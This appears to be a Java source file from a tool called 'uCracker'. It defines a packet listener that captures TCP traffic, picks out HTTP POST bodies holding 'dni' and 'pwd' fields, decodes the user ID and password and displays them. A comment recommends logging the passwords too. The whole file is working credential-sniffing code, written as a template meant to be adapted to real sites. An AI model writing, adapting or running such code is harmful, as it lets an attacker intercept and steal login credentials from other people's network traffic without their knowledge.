package org.uCracker.listeners;

import java.net.URLDecoder;
import java.util.regex.Pattern;

import net.sourceforge.jpcap.net.Packet;
import net.sourceforge.jpcap.net.TCPPacket;

import org.apache.log4j.Logger;
import org.uCracker.util.ArgsPresentator;
import org.uCracker.util.uCrackerPacketListener;

public class ExamplePacketListener implements uCrackerPacketListener{
	
	private static final Logger LOG = Logger.getLogger(ExamplePacketListener.class);

	private static final String EXAMPLE_HOST = "example.com";
	private static final String EXAMPLE_CREDENTIAL_PATTERN = "dni=.*&pwd=.*(&.*)*";
	
	private ArgsPresentator argsPresentator;
	
	public ExamplePacketListener(ArgsPresentator argsPresentator) {
		this.argsPresentator = argsPresentator;
	}

	public void packetArrived(Packet packet) {
		try {
			//TODO check host!
			
			// only handle TCP packets
			if (packet instanceof TCPPacket) {
				TCPPacket tcpPacket = (TCPPacket) packet;
				byte[] data = tcpPacket.getTCPData();
				String isoData = new String(data, "ISO-8859-1");
				if(isoData.startsWith("POST")){
					String[] sections = isoData.split("\r\n\r\n");
					if(sections.length >= 2){
						if( Pattern.matches(EXAMPLE_CREDENTIAL_PATTERN, sections[1]) ){
							
							String dni, pwd;
							String[] parameters = sections[1].split("&");
							dni = parameters[0].substring(parameters[0].indexOf("=") + 1, parameters[0].length());
							pwd = parameters[1].substring(parameters[1].indexOf("=") + 1, parameters[1].length());
							dni = URLDecoder.decode(dni, "UTF-8");
							pwd = URLDecoder.decode(pwd, "UTF-8");
							
							//OPTIONAL and RECOMENDED logging
							LOG.trace("> dni:'" + dni + "' - pwd:'" + pwd + "'");
							
							argsPresentator.display(dni, pwd, this.getHost());
						}
					}
				}
			}
		} catch (Exception e) {
			LOG.error("An error has occurred while analazing a packet.");
		}
	}

	public String getHost() {
		return EXAMPLE_HOST;
	}
}
